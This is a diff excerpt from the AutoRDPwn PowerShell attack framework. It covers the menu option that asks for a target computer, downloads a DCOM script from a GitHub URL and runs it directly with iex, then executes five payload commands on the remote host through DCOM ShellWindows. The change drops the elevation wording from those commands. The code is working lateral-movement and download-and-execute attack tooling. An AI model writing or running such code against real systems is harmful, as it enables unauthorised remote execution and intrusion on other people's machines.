@@ -320,13 +320,13 @@ if($Language -in 'Spanish') {
 	'7' {
 	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
 	$computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
-	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; $hash = "true"
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn1"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn2"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn3"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn4"
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe start-process -verb runas $Pwn5" }
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn2"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn3"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn4"
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn5" }
 
         'M' { Show-Banner ; Show-Modules
         $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
